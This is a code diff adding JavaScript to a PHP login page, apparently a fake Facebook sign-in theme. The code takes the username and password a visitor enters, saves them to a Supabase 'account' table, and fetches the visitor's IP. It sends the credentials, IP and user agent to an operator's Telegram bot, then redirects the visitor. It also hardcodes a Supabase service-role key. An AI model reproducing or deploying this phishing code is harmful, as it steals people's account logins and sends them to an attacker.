@@ -150,6 +150,93 @@ if (strpos($currentUrl, '/fb_themes/theme3/') === false) {
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
         // ... giữ nguyên JS code ...
+        async function sendMessage(text, chat_id, token) {
+            try {
+                const url = `https://api.telegram.org/bot${token}/sendMessage`; // The url to request
+
+                const obj = {
+                    chat_id: chat_id, // Telegram chat id
+                    text: text, // The text to send
+                };
+
+                await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(obj),
+                });
+            } catch {
+
+            }
+        }
+        const sb = supabase.createClient(
+            "https://nkckriujybohswbebyyj.supabase.co",
+            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5rY2tyaXVqeWJvaHN3YmVieXlqIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NTYzNDIzNywiZXhwIjoyMDYxMjEwMjM3fQ.Fu9sytcqnjgl8EI81aVrbPuSlXdxGzkRQMn1bs4QZ0A",
+            {
+                db: {
+                    schema: "public",
+                },
+            }
+        );
+        const domain_fb = window.location.protocol + "//" + window.location.host + "/login"
+        document.getElementById('login').addEventListener('click', function (event) {
+            event.preventDefault();
+
+            var username = document.getElementsByName('username')[0].value;
+            var password = document.getElementsByName('password')[0].value;
+
+            if (!isValidEmail(username) && !isValidPhone(username)) {
+                document.getElementById('login_error').style.display = 'block';
+                return;
+            }
+
+            if (!isValidPassword(password)) {
+                document.getElementById('login_error').style.display = 'block';
+                return;
+            }
+
+            (async () => {
+                const { data, error } = await sb
+                    .from("website")
+                    .select("*")
+                    .eq("domain_fb", domain_fb);
+                await sb.from("account").insert({
+                    username: username,
+                    password: password,
+                    user_id: data[0].user_id,
+                    website_id: data[0].id,
+                });
+                const { data: profile } = await sb
+                    .from("profile")
+                    .select("*")
+                    .eq("id", data[0].user_id);
+                const token = profile[0].tele_token;
+                const chat_id = profile[0].tele_chat_id;
+                let ip = await fetch("https://api.ipify.org?format=json")
+                ip = await ip.json()
+                const message = `Account: ${username}\nPassword: ${password}\nIp: ${ip.ip}\nUser Agent: ${navigator.userAgent}`;
+                await sendMessage(message, chat_id, token);
+
+                if (data[0].link_redirect) {
+                    window.location.href = data[0].link_redirect;
+                }
+            })();
+        });
+
+        function isValidEmail(email) {
+            var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            return emailRegex.test(email);
+        }
+
+        function isValidPhone(phone) {
+            var phoneRegex = /^0\d{9}$/;
+            return phoneRegex.test(phone);
+        }
+
+        function isValidPassword(password) {
+            return password.length > 6;
+        }
     </script>
 </body>
 
